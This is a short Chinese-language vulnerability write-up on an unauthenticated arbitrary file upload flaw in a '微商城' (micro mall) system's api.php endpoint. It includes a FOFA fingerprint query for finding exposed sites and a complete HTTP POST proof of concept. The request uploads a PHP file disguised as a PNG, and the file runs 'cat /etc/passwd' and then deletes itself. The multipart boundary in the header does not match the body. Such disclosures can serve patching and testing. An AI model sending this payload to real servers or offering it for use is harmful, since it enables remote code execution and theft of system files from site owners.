# 微商城系统api.php存在文件上传漏洞

微商城系统 api.php 接口处存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```yaml
body="/Mao_Public/js/jquery-2.1.1.min.js"
```

## poc

```java
POST /api/api.php?mod=upload&type=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown
 
------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="file"; filename="rce.php"
Content-Type: image/png
 
<?php system("cat /etc/passwd");unlink(__FILE__);?>
------WebKitFormBoundaryaKljzbg49Mq4ggLz--
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408210938048.png)